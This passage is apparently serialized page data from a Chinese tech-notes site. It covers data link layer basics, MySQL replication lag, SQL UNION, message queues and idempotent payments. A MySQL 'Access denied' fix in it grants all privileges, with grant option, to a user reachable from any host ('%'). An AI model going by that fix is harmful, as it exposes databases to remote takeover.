设置数据链路层的目的\n\n在原始的、有差错的物理传输线路的基础上，采取差错检测、差错控制与流量控制等方法，将有差错的物理线路改进成逻辑上无差错的数据链路，向网络层提供高质量的服务。\n\n\n# 信道的两种类型\n\n * 点对点信道： 这种信道使用一对一的点对点通信方式。\n\n * 广播信道： 这种信道使用一对多的广播通信方式。广播信道上连接的主机很多，须使用专用的共享信道协议来协调这些主机的数据发送。\n\n\n# 链路(link)和数据链路(data link)\n\n链路(link)是从一个结点到相邻结点的一段物理线路，中间没有任何其他的交换结点。\n\n * 数据通信时，两个计算机之间的通信路径往往需要经过多个这种链路，也称为物理链路；\n * 一条链路只是一条通路（路径）的组成部分；\n * 物理线路：点对点（ 结点到相邻结点）\n * 物理线路：有线的、无线的、局域网\n\n数据链路(data link) 把实现通信协议的硬件和软件加到链路上，就构成了数据链路，也称为逻辑链路。\n\n * 适配器（即网卡）来实现这些协议的硬件和软件；\n * 适配器：一般包括了数据链路层和物理层的功能；\n * 逻辑链路是建立在物理链路之上；\n * 如果物理线路都不通，不可能建立用于数据传输的逻辑链路。\n\n\n# 基本功能\n\n\n# 1.封装成帧\n\n封装成帧\n\n * 数据链路层传输单位是“帧”。\n * 把数据报组装成“帧”，正确发送、接收、解封。\n\n\n# 2. 透明传输\n\n透明传输\n\n * 无论哪种比特组合， 都可以在数据链路上进行有效传输\n * 要区分数据信息、控制信息。\n\n\n# 3. 差错控制\n\n差错检测\n\n * 数据通信中难免出现传送错误，要降低出错率，提高可靠性。\n * 要尽可能地检测错误，并纠正错误。\n\n\n# 4. 流量控制\n\n * 控制数据通信的流量，确保数据通信的有序进行；\n * 避免因为接收方来不及接收， 而造成数据丢失。\n\n\n# 5. 链路管理\n\n * 通信时，双方先要建立一条数据链路； 传输数据时要维持数据链路； 通 信完毕时要释放数据链路。\n\n\n# 6. mac寻址\n\n * mac子层主要功能。\n * 指的是网卡的mac地址， 即“物理地址”、“硬件地址” 。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"MySQL读写分离及主从时延",frontmatter:{title:"MySQL读写分离及主从时延",date:"2022-04-30T17:00:54.000Z",permalink:"/pages/57a6a5/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/20.MySQL%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%97%B6%E5%BB%B6.html",relativePath:"10.数据库/20.MySQL读写分离及主从时延.md",key:"v-6a62d04b",path:"/pages/57a6a5/",headers:[{level:2,title:"MySQL主从复制原理的是啥？",slug:"mysql主从复制原理的是啥",normalizedTitle:"mysql主从复制原理的是啥？",charIndex:29},{level:2,title:"MySQL主从同步延时问题（重点）",slug:"mysql主从同步延时问题-重点",normalizedTitle:"mysql主从同步延时问题（重点）",charIndex:1015}],headersStr:"MySQL主从复制原理的是啥？ MySQL主从同步延时问题（重点）",content:"# 面试题\n\n * 如何实现mysql的读写分离？\n * MySQL主从复制原理的是啥？\n * 如何解决mysql主从同步的延时问题？\n\n\n# 如何实现mysql的读写分离？\n\n其实很简单，就是基于主从复制架构，简单来说，就搞一个主库，挂多个从库，然后我们就单单只是写主库，然后主库会自动把数据给同步到从库上去。一般情况下，主库可以挂4-5个从库\n\n\n\n\n# MySQL主从复制原理的是啥？\n\nMySQL里有一个概念，叫binlog日志，就是每个增删改类的操作，会改变数据的操作，除了更新数据以外，对这个增删改操作还会写入一个日志文件，记录这个操作的日志。\n\n主库将变更写binlog日志，然后从库连接到主库之后，从库有一个IO线程，将主库的binlog日志拷贝到自己本地，写入一个中继日志中。接着从库中有一个SQL线程会从中继日志读取binlog，然后执行binlog日志中的内容，也就是在自己本地再次执行一遍SQL，这样就可以保证自己跟主库的数据是一样的。\n\n这里有一个非常重要的一点，就是从库同步主库数据的过程是串行化的，也就是说主库上并行的操作，在从库上会串行执行。所以这就是一个非常重要的点了，由于从库从主库拷贝日志以及串行执行SQL的特点，在高并发场景下，从库的数据一定会比主库慢一些，是有延时的。所以经常出现，刚写入主库的数据可能是读不到的，要过几十毫秒，甚至几百毫秒才能读取到。\n\n而且这里还有另外一个问题，就是如果主库突然宕机，然后恰好数据还没同步到从库，那么有些数据可能在从库上是没有的，有些数据可能就丢失了。\n\n所以mysql实际上在这一块有两个机制，一个是半同步复制，用来解决主库数据丢失问题；一个是并行复制，用来解决主从同步延时问题。\n\n这个所谓半同步复制，semi-sync复制，指的就是主库写入binlog日志之后，就会将强制此时立即将数据同步到从库，从库将日志写入自己本地的relay log之后，接着会返回一个ack给主库，主库接收到至少一个从库的ack之后才会认为写操作完成了。\n\n所谓并行复制，指的是从库开启多个线程，并行读取relay log中不同库的日志，然后并行重放不同库的日志，这是库级别的并行。\n\n * 主从复制的原理\n * 主从延迟问题产生的原因\n * 主从复制的数据丢失问题，以及半同步复制的原理\n * 并行复制的原理，多库并发重放relay日志，缓解主从延迟问题\n\n\n\n\n# MySQL主从同步延时问题（重点）\n\n线上确实处理过因为主从同步延时问题，导致的线上的bug，小型的生产事故\n\nshow status，Seconds_Behind_Master，你可以看到从库复制主库的数据落后了几ms\n\n其实这块东西我们经常会碰到，就比如说用了mysql主从架构之后，可能会发现，刚写入库的数据结果没查到，结果就完蛋了。。。。\n\n所以实际上你要考虑好应该在什么场景下来用这个mysql主从同步，建议是一般在读远远多于写，而且读的时候一般对数据时效性要求没那么高的时候，用mysql主从同步\n\n所以这个时候，我们可以考虑的一个事情就是，你可以用mysql的并行复制，但是问题是那是库级别的并行，所以有时候作用不是很大\n\n所以这个时候。。通常来说，我们会对于那种写了之后立马就要保证可以查到的场景，采用强制读主库的方式，这样就可以保证你肯定的可以读到数据了吧。其实用一些数据库中间件是没问题的。\n\n一般来说，如果主从延迟较为严重\n\n * 分库，将一个主库拆分为4个主库，每个主库的写并发就500/s，此时主从延迟可以忽略不计\n * 打开mysql支持的并行复制，多个库并行复制，如果说某个库的写入并发就是特别高，单库写并发达到了2000/s，并行复制还是没意义。28法则，很多时候比如说，就是少数的几个订单表，写入了2000/s，其他几十个表10/s。\n * 重写代码，写代码的同学，要慎重，当时我们其实短期是让那个同学重写了一下代码，插入数据之后，直接就更新，不要查询\n * 如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询设置直连主库。不推荐这种方法，你这么搞导致读写分离的意义就丧失了\n\n",normalizedContent:"# 面试题\n\n * 如何实现mysql的读写分离？\n * mysql主从复制原理的是啥？\n * 如何解决mysql主从同步的延时问题？\n\n\n# 如何实现mysql的读写分离？\n\n其实很简单，就是基于主从复制架构，简单来说，就搞一个主库，挂多个从库，然后我们就单单只是写主库，然后主库会自动把数据给同步到从库上去。一般情况下，主库可以挂4-5个从库\n\n\n\n\n# mysql主从复制原理的是啥？\n\nmysql里有一个概念，叫binlog日志，就是每个增删改类的操作，会改变数据的操作，除了更新数据以外，对这个增删改操作还会写入一个日志文件，记录这个操作的日志。\n\n主库将变更写binlog日志，然后从库连接到主库之后，从库有一个io线程，将主库的binlog日志拷贝到自己本地，写入一个中继日志中。接着从库中有一个sql线程会从中继日志读取binlog，然后执行binlog日志中的内容，也就是在自己本地再次执行一遍sql，这样就可以保证自己跟主库的数据是一样的。\n\n这里有一个非常重要的一点，就是从库同步主库数据的过程是串行化的，也就是说主库上并行的操作，在从库上会串行执行。所以这就是一个非常重要的点了，由于从库从主库拷贝日志以及串行执行sql的特点，在高并发场景下，从库的数据一定会比主库慢一些，是有延时的。所以经常出现，刚写入主库的数据可能是读不到的，要过几十毫秒，甚至几百毫秒才能读取到。\n\n而且这里还有另外一个问题，就是如果主库突然宕机，然后恰好数据还没同步到从库，那么有些数据可能在从库上是没有的，有些数据可能就丢失了。\n\n所以mysql实际上在这一块有两个机制，一个是半同步复制，用来解决主库数据丢失问题；一个是并行复制，用来解决主从同步延时问题。\n\n这个所谓半同步复制，semi-sync复制，指的就是主库写入binlog日志之后，就会将强制此时立即将数据同步到从库，从库将日志写入自己本地的relay log之后，接着会返回一个ack给主库，主库接收到至少一个从库的ack之后才会认为写操作完成了。\n\n所谓并行复制，指的是从库开启多个线程，并行读取relay log中不同库的日志，然后并行重放不同库的日志，这是库级别的并行。\n\n * 主从复制的原理\n * 主从延迟问题产生的原因\n * 主从复制的数据丢失问题，以及半同步复制的原理\n * 并行复制的原理，多库并发重放relay日志，缓解主从延迟问题\n\n\n\n\n# mysql主从同步延时问题（重点）\n\n线上确实处理过因为主从同步延时问题，导致的线上的bug，小型的生产事故\n\nshow status，seconds_behind_master，你可以看到从库复制主库的数据落后了几ms\n\n其实这块东西我们经常会碰到，就比如说用了mysql主从架构之后，可能会发现，刚写入库的数据结果没查到，结果就完蛋了。。。。\n\n所以实际上你要考虑好应该在什么场景下来用这个mysql主从同步，建议是一般在读远远多于写，而且读的时候一般对数据时效性要求没那么高的时候，用mysql主从同步\n\n所以这个时候，我们可以考虑的一个事情就是，你可以用mysql的并行复制，但是问题是那是库级别的并行，所以有时候作用不是很大\n\n所以这个时候。。通常来说，我们会对于那种写了之后立马就要保证可以查到的场景，采用强制读主库的方式，这样就可以保证你肯定的可以读到数据了吧。其实用一些数据库中间件是没问题的。\n\n一般来说，如果主从延迟较为严重\n\n * 分库，将一个主库拆分为4个主库，每个主库的写并发就500/s，此时主从延迟可以忽略不计\n * 打开mysql支持的并行复制，多个库并行复制，如果说某个库的写入并发就是特别高，单库写并发达到了2000/s，并行复制还是没意义。28法则，很多时候比如说，就是少数的几个订单表，写入了2000/s，其他几十个表10/s。\n * 重写代码，写代码的同学，要慎重，当时我们其实短期是让那个同学重写了一下代码，插入数据之后，直接就更新，不要查询\n * 如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询设置直连主库。不推荐这种方法，你这么搞导致读写分离的意义就丧失了\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看",frontmatter:{title:"远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/25b663/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/22.%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%97%B6%E5%87%BA%E7%8E%B0Access%20denied%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%20-%20%E8%B5%B0%E7%9C%8B%E7%9C%8B.html",relativePath:"10.数据库/22.远程登录服务器MySql数据库时出现Access denied的解决办法 - 走看看.md",key:"v-b3671c30",path:"/pages/25b663/",headersStr:null,content:"# 远程登录服务器MySql数据库时出现Access denied的解决办法\n\n> 错误提示： 在MySQL登录时出现Access denied for user 'root'@'localhost' (using password:（ YES)\n\n这种错误一般是在远程连接时，用户root对应的密码输入不正确。首先仔细检查密码。之后，如果确保密码正确的情况下，再使用以下方式解决\n\n首先通过本地或者ssh打开mysql： 在控制台输入指令,回车后输入密码，进入到mysql\n\nmysql -uroot -p \n\n\n1\n\n在依次输入指令\n\nuse mysql;\nshow tables; \n\n\n1\n2\n\n\n出现数据库的user表；输入指令查看：\n\nselect user，host from user; \n\n\n1\n\n\n走到这一步我们发现，root用户的host地址为host，仅限于本地使用，如果远程连接时，自然会被阻止。我们需要输入修改权限指令，让其实现无限制访问：\n\nGRANT ALL PRIVILEGES ON *.* TO 'your name'@'%' IDENTIFIED BY 'your password' WITH GRANT OPTION; \n\n\n1\n\n\n以上yourname就是文章开头提到的错误提示框的用户名（root），而password就是该用户名(root)对应的正确的密码。(==请先复制以上指令到任意地方，修改好再使用==) 执行完毕后，还要执行一遍二次命令,退出数据库，可即时生效\n\nflush privileges;\nexit \n\n\n1\n2\n\n\n再使用Navicat或者其他的远程连接时，即可畅通无阻\n\n原理就是更改了root用户的ip限制，我们再次查看时，可得到如下结果。 root用户的host已经添加上无限制的%",normalizedContent:"# 远程登录服务器mysql数据库时出现access denied的解决办法\n\n> 错误提示： 在mysql登录时出现access denied for user 'root'@'localhost' (using password:（ yes)\n\n这种错误一般是在远程连接时，用户root对应的密码输入不正确。首先仔细检查密码。之后，如果确保密码正确的情况下，再使用以下方式解决\n\n首先通过本地或者ssh打开mysql： 在控制台输入指令,回车后输入密码，进入到mysql\n\nmysql -uroot -p \n\n\n1\n\n在依次输入指令\n\nuse mysql;\nshow tables; \n\n\n1\n2\n\n\n出现数据库的user表；输入指令查看：\n\nselect user，host from user; \n\n\n1\n\n\n走到这一步我们发现，root用户的host地址为host，仅限于本地使用，如果远程连接时，自然会被阻止。我们需要输入修改权限指令，让其实现无限制访问：\n\ngrant all privileges on *.* to 'your name'@'%' identified by 'your password' with grant option; \n\n\n1\n\n\n以上yourname就是文章开头提到的错误提示框的用户名（root），而password就是该用户名(root)对应的正确的密码。(==请先复制以上指令到任意地方，修改好再使用==) 执行完毕后，还要执行一遍二次命令,退出数据库，可即时生效\n\nflush privileges;\nexit \n\n\n1\n2\n\n\n再使用navicat或者其他的远程连接时，即可畅通无阻\n\n原理就是更改了root用户的ip限制，我们再次查看时，可得到如下结果。 root用户的host已经添加上无限制的%",charsets:{cjk:!0},lastUpdated:"2022/05/31, 14:41:23",lastUpdatedTimestamp:1653979283e3},{title:"SQL UNION 操作符",frontmatter:{title:"SQL UNION 操作符",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/c7aa94/",categories:["数据库"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/21.SQL%20UNION%20%E6%93%8D%E4%BD%9C%E7%AC%A6.html",relativePath:"10.数据库/21.SQL UNION 操作符.md",key:"v-7f2d57fe",path:"/pages/c7aa94/",headers:[{level:2,title:"SQL UNION 操作符",slug:"sql-union-操作符",normalizedTitle:"sql union 操作符",charIndex:2},{level:3,title:"SQL UNION 语法",slug:"sql-union-语法",normalizedTitle:"sql union 语法",charIndex:306},{level:3,title:"SQL UNION ALL 语法",slug:"sql-union-all-语法",normalizedTitle:"sql union all 语法",charIndex:451},{level:2,title:"演示数据库",slug:"演示数据库",normalizedTitle:"演示数据库",charIndex:646},{level:2,title:"SQL UNION 实例",slug:"sql-union-实例",normalizedTitle:"sql union 实例",charIndex:1962},{level:2,title:"实例",slug:"实例",normalizedTitle:"实例",charIndex:1972},{level:2,title:"SQL UNION ALL 实例",slug:"sql-union-all-实例",normalizedTitle:"sql union all 实例",charIndex:2292},{level:2,title:"实例",slug:"实例-2",normalizedTitle:"实例",charIndex:1972},{level:2,title:"带有 WHERE 的 SQL UNION ALL",slug:"带有-where-的-sql-union-all",normalizedTitle:"带有 where 的 sql union all",charIndex:2536},{level:2,title:"实例",slug:"实例-3",normalizedTitle:"实例",charIndex:1972}],headersStr:"SQL UNION 操作符 SQL UNION 语法 SQL UNION ALL 语法 演示数据库 SQL UNION 实例 实例 SQL UNION ALL 实例 实例 带有 WHERE 的 SQL UNION ALL 实例",content:'> SQL UNION 操作符 SQL UNION 操作符合并两个或多个 SELECT 语句的结果。\n\n----------------------------------------\n\nSQL UNION 操作符合并两个或多个 SELECT 语句的结果。\n\n----------------------------------------\n\n\n# SQL UNION 操作符\n\nUNION 操作符用于合并两个或多个 SELECT 语句的结果集。\n\n请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。\n\n\n# SQL UNION 语法\n\nSELECT column_name(s) FROM table1\nUNION\nSELECT column_name(s) FROM table2;\n\n**注释：**默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。\n\n\n# SQL UNION ALL 语法\n\nSELECT column_name(s) FROM table1\nUNION ALL\nSELECT column_name(s) FROM table2;\n\n**注释：**UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。\n\n----------------------------------------\n\n\n# 演示数据库\n\n在本教程中，我们将使用 RUNOOB 样本数据库。\n\n下面是选自 "Websites" 表的数据：\n\nmysql> SELECT * FROM Websites;\n+----+--------------+---------------------------+-------+---------+\n| id | name         | url                       | alexa | country |\n+----+--------------+---------------------------+-------+---------+\n| 1  | Google       | https://www.google.cm/    | 1     | USA     |\n| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |\n| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |\n| 4  | 微博          | http://weibo.com/         | 20    | CN      |\n| 5  | Facebook     | https://www.facebook.com/ | 3     | USA     |\n| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |\n+----+---------------+---------------------------+-------+---------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n下面是 "apps" APP 的数据：\n\nmysql> SELECT * FROM apps;\n+----+------------+-------------------------+---------+\n| id | app_name   | url                     | country |\n+----+------------+-------------------------+---------+\n|  1 | QQ APP     | http://im.qq.com/       | CN      |\n|  2 | 微博 APP | http://weibo.com/       | CN      |\n|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |\n+----+------------+-------------------------+---------+\n3 rows in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n----------------------------------------\n\n\n# SQL UNION 实例\n\n下面的 SQL 语句从 "Websites" 和 "apps" 表中选取所有不同的 country（只有不同的值）：\n\n\n# 实例\n\nSELECT country FROM Websites\nUNION\nSELECT country FROM apps\nORDER BY country;\n\n执行以上 SQL 输出结果如下：\n\n\n\n**注释：**UNION 不能用于列出两个表中所有的 country。如果一些网站和 APP 来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！\n\n----------------------------------------\n\n\n# SQL UNION ALL 实例\n\n下面的 SQL 语句使用 UNION ALL 从 "Websites" 和 "apps" 表中选取所有的 country（也有重复的值）：\n\n\n# 实例\n\nSELECT country FROM Websites\nUNION ALL\nSELECT country FROM apps\nORDER BY country;\n\n执行以上 SQL 输出结果如下：\n\n\n\n----------------------------------------\n\n\n# 带有 WHERE 的 SQL UNION ALL\n\n下面的 SQL 语句使用 UNION ALL 从 "Websites" 和 "apps" 表中选取所有的中国 (CN) 的数据（也有重复的值）：\n\n\n# 实例\n\nSELECT country, name FROM Websites\nWHERE country=\'CN\'\nUNION ALL\nSELECT country, app_name FROM apps\nWHERE country=\'CN\'\nORDER BY country;\n\n执行以上 SQL 输出结果如下：\n\n',normalizedContent:'> sql union 操作符 sql union 操作符合并两个或多个 select 语句的结果。\n\n----------------------------------------\n\nsql union 操作符合并两个或多个 select 语句的结果。\n\n----------------------------------------\n\n\n# sql union 操作符\n\nunion 操作符用于合并两个或多个 select 语句的结果集。\n\n请注意，union 内部的每个 select 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 select 语句中的列的顺序必须相同。\n\n\n# sql union 语法\n\nselect column_name(s) from table1\nunion\nselect column_name(s) from table2;\n\n**注释：**默认地，union 操作符选取不同的值。如果允许重复的值，请使用 union all。\n\n\n# sql union all 语法\n\nselect column_name(s) from table1\nunion all\nselect column_name(s) from table2;\n\n**注释：**union 结果集中的列名总是等于 union 中第一个 select 语句中的列名。\n\n----------------------------------------\n\n\n# 演示数据库\n\n在本教程中，我们将使用 runoob 样本数据库。\n\n下面是选自 "websites" 表的数据：\n\nmysql> select * from websites;\n+----+--------------+---------------------------+-------+---------+\n| id | name         | url                       | alexa | country |\n+----+--------------+---------------------------+-------+---------+\n| 1  | google       | https://www.google.cm/    | 1     | usa     |\n| 2  | 淘宝          | https://www.taobao.com/   | 13    | cn      |\n| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | cn      |\n| 4  | 微博          | http://weibo.com/         | 20    | cn      |\n| 5  | facebook     | https://www.facebook.com/ | 3     | usa     |\n| 7  | stackoverflow | http://stackoverflow.com/ |   0 | ind     |\n+----+---------------+---------------------------+-------+---------+\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n下面是 "apps" app 的数据：\n\nmysql> select * from apps;\n+----+------------+-------------------------+---------+\n| id | app_name   | url                     | country |\n+----+------------+-------------------------+---------+\n|  1 | qq app     | http://im.qq.com/       | cn      |\n|  2 | 微博 app | http://weibo.com/       | cn      |\n|  3 | 淘宝 app | https://www.taobao.com/ | cn      |\n+----+------------+-------------------------+---------+\n3 rows in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n----------------------------------------\n\n\n# sql union 实例\n\n下面的 sql 语句从 "websites" 和 "apps" 表中选取所有不同的 country（只有不同的值）：\n\n\n# 实例\n\nselect country from websites\nunion\nselect country from apps\norder by country;\n\n执行以上 sql 输出结果如下：\n\n\n\n**注释：**union 不能用于列出两个表中所有的 country。如果一些网站和 app 来自同一个国家，每个国家只会列出一次。union 只会选取不同的值。请使用 union all 来选取重复的值！\n\n----------------------------------------\n\n\n# sql union all 实例\n\n下面的 sql 语句使用 union all 从 "websites" 和 "apps" 表中选取所有的 country（也有重复的值）：\n\n\n# 实例\n\nselect country from websites\nunion all\nselect country from apps\norder by country;\n\n执行以上 sql 输出结果如下：\n\n\n\n----------------------------------------\n\n\n# 带有 where 的 sql union all\n\n下面的 sql 语句使用 union all 从 "websites" 和 "apps" 表中选取所有的中国 (cn) 的数据（也有重复的值）：\n\n\n# 实例\n\nselect country, name from websites\nwhere country=\'cn\'\nunion all\nselect country, app_name from apps\nwhere country=\'cn\'\norder by country;\n\n执行以上 sql 输出结果如下：\n\n',charsets:{cjk:!0},lastUpdated:"2022/05/15, 11:42:40",lastUpdatedTimestamp:165258616e4},{title:"数据库",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"10.数据库",imgUrl:"/img/catalog.png",description:"数据库"}},title:"数据库",date:"2022-04-17T21:48:12.000Z",permalink:"/database/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/10.%E6%95%B0%E6%8D%AE%E5%BA%93/catalog.html",relativePath:"10.数据库/catalog.md",key:"v-5ee328c8",path:"/database/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"什么是幂等性",frontmatter:{title:"什么是幂等性",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/0a3fca/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/01.%E4%BB%80%E4%B9%88%E6%98%AF%E5%B9%82%E7%AD%89%E6%80%A7.html",relativePath:"11.消息队列/01.什么是幂等性.md",key:"v-39473ee5",path:"/pages/0a3fca/",headersStr:null,content:"幂等性：就是用户对于同一操作发起的一次请求或者多次请求的结果是一致的，不会因为多次点击而产生了副作用。举个最简单的例子，那就是支付，用户购买商品后支付，支付扣款成功，但是返回结果的时候网络异常，此时钱已经扣了，用户再次点击按钮，此时会进行第二次扣款，返回结果成功，用户查询余额发现多扣钱了，流水记录也变成了两条。在以前的单应用系统中，我们只需要把数据操作放入事务中即可，发生错误立即回滚，但是再响应客户端的时候也有可能出现网络中断或者异常等等。 那么如何设计接口才能做到幂等呢？",normalizedContent:"幂等性：就是用户对于同一操作发起的一次请求或者多次请求的结果是一致的，不会因为多次点击而产生了副作用。举个最简单的例子，那就是支付，用户购买商品后支付，支付扣款成功，但是返回结果的时候网络异常，此时钱已经扣了，用户再次点击按钮，此时会进行第二次扣款，返回结果成功，用户查询余额发现多扣钱了，流水记录也变成了两条。在以前的单应用系统中，我们只需要把数据操作放入事务中即可，发生错误立即回滚，但是再响应客户端的时候也有可能出现网络中断或者异常等等。 那么如何设计接口才能做到幂等呢？",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"为什么要使用消息队列？",frontmatter:{title:"为什么要使用消息队列？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/a135d1/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/00.%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9F.html",relativePath:"11.消息队列/00.为什么要使用消息队列？.md",key:"v-0d3097c3",path:"/pages/a135d1/",headers:[{level:2,title:"不使用MQ时",slug:"不使用mq时",normalizedTitle:"不使用mq时",charIndex:12},{level:2,title:"使用MQ后",slug:"使用mq后",normalizedTitle:"使用mq后",charIndex:116},{level:2,title:"不用MQ的同步高延时请求场景",slug:"不用mq的同步高延时请求场景",normalizedTitle:"不用mq的同步高延时请求场景",charIndex:137},{level:2,title:"使用MQ进行异步化",slug:"使用mq进行异步化",normalizedTitle:"使用mq进行异步化",charIndex:158},{level:2,title:"没有用MQ的削峰",slug:"没有用mq的削峰",normalizedTitle:"没有用mq的削峰",charIndex:183},{level:2,title:"使用MQ来进行削峰",slug:"使用mq来进行削峰",normalizedTitle:"使用mq来进行削峰",charIndex:198}],headersStr:"不使用MQ时 使用MQ后 不用MQ的同步高延时请求场景 使用MQ进行异步化 没有用MQ的削峰 使用MQ来进行削峰",content:"# 1. 解耦\n\n\n# 不使用MQ时\n\n当后面系统不断增加，比如 E，F系统的加入，以及D系统的移除 因为A系统和其它各种系统耦合起来，那么需要处理的事情会给出多\n\n * 需要硬编码，访问失败重试\n * 出现扩展需要改代码\n\n\n# 使用MQ后\n\n\n\n\n# 2.异步\n\n\n# 不用MQ的同步高延时请求场景\n\n\n\n\n# 使用MQ进行异步化\n\n\n\n\n# 3.削峰\n\n\n# 没有用MQ的削峰\n\n\n\n\n# 使用MQ来进行削峰\n\n",normalizedContent:"# 1. 解耦\n\n\n# 不使用mq时\n\n当后面系统不断增加，比如 e，f系统的加入，以及d系统的移除 因为a系统和其它各种系统耦合起来，那么需要处理的事情会给出多\n\n * 需要硬编码，访问失败重试\n * 出现扩展需要改代码\n\n\n# 使用mq后\n\n\n\n\n# 2.异步\n\n\n# 不用mq的同步高延时请求场景\n\n\n\n\n# 使用mq进行异步化\n\n\n\n\n# 3.削峰\n\n\n# 没有用mq的削峰\n\n\n\n\n# 使用mq来进行削峰\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"那么如何设计接口才能做到幂等呢？",frontmatter:{title:"那么如何设计接口才能做到幂等呢？",date:"2022-04-18T00:00:45.000Z",permalink:"/pages/5dde54/",categories:["消息队列"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/11.%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/02.%E9%82%A3%E4%B9%88%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%8E%A5%E5%8F%A3%E6%89%8D%E8%83%BD%E5%81%9A%E5%88%B0%E5%B9%82%E7%AD%89%E5%91%A2%EF%BC%9F.html",relativePath:"11.消息队列/02.那么如何设计接口才能做到幂等呢？.md",key:"v-61b941f4",path:"/pages/5dde54/",headersStr:null,content:"方法一：单次支付请求，也就是直接支付了，不需要额外的数据库操作了，这个时候发起异步请求创建一个唯一的ticketId，就是门票，这张门票只能使用一次就作废，具体步骤如下：\n\n1、异步请求获取门票\n\n2、调用支付，传入门票\n\n3、根据门票ID查询此次操作是否存在，如果存在则表示该操作已经执行过，直接返回结果；如果不存在，支付扣款，保存结果\n\n4、返回结果到客户端\n\n如果步骤4通信失败，用户再次发起请求，那么最终结果还是一样的.\n\n方法二：分布式环境下各个服务相互调用\n\n这边就要举例我们的系统了，我们支付的时候先要扣款，然后更新订单，这个地方就涉及到了订单服务以及支付服务了。用户调用支付，扣款成功后，更新对应订单状态，然后再保存流水。而在这个地方就没必要使用门票ticketId了，因为会比较闲的麻烦（支付状态：未支付，已支付）\n\n步骤：\n\n1、查询订单支付状态\n\n2、如果已经支付，直接返回结果\n\n3、如果未支付，则支付扣款并且保存流水\n\n4、返回支付结果\n\n如果步骤4通信失败，用户再次发起请求，那么最终结果还是一样的\n\n对于做过支付的朋友，幂等也可以称之为冲正，保证客户端与服务端的交易一致性，避免多次扣款。",normalizedContent:"方法一：单次支付请求，也就是直接支付了，不需要额外的数据库操作了，这个时候发起异步请求创建一个唯一的ticketid，就是门票，这张门票只能使用一次就作废，具体步骤如下：\n\n1、异步请求获取门票\n\n2、调用支付，传入门票\n\n3、根据门票id查询此次操作是否存在，如果存在则表示该操作已经执行过，直接返回结果；如果不存在，支付扣款，保存结果\n\n4、返回结果到客户端\n\n如果步骤4通信失败，用户再次发起请求，那么最终结果还是一样的.\n\n方法二：分布式环境下各个服务相互调用\n\n这边就要举例我们的系统了，我们支付的时候先要扣款，然后更新订单，这个地方就涉及到了订单服务以及支付服务了。用户调用支付，扣款成功后，更新对应订单状态，然后再保存流水。而在这个地方就没必要使用门票ticketid了，因为会比较闲的麻烦（支付状态：未支付，已支付）\n\n步骤：\n\n1、查询订单支付状态\n\n2、如果已经支付，直接返回结果\n\n3、如果未支付，则支付扣款并且保存流水\n\n4、返回支付结果\n\n如果步骤4通信失败，用户再次发起请求，那么最终结果还是一样的\n\n对于做过支付的朋友，幂等也可以称之为冲正，保证客户端与服务端的交易一致性，避免多次扣款。",charsets:{cjk:!0},lastUpdated:"